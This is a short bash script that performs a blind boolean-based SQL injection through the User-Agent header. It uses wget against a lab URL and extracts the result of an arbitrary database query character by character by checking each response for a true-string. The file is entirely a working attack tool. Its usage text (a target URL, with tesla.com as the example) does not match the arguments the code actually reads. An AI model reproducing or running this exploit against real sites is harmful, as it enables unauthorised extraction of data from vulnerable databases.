#!/bin/bash

grn='\033[0;32m'
red='\033[0;31m'
charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@ \+ \=`
export ua="Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" # <-- Change as needed
export url="http://1.lab.sqli.site/getBrowserInfo.php" # <-- Change as needed
export truestring="It's nothing new" # <-- Change as needed
export maxlength=$1
export query=$2
export result=""

if [ "$1" == "" ]
then
	printf "${red} Usage: ./r3con.sh target.url\n"
	printf "${red} Example: ./r3con.sh tesla.com\n"
else
	printf "${grn} [*] Extracting the results of $query\n"
	for ((j=1;j<$maxlength;j+=1))
	do
		export nthchar=$j
		for i in $charset
		do
			wget "-U $ua' and substring($query,$nthchar,1)='$i" -q -O - $url | grep "$truestring" &> /dev/null
			if [ "$?" == "0" ]
			then
				printf "${grn} [+] Character number $nthchar found: $i\n"
				export result+=$i
			fi
	done
done
fi

printf "${grn} [*] Result: $result\n"
printf "${grn} [*] Done!\n"
printf "${grn} [*] Happy hacking @rootshooter!\n"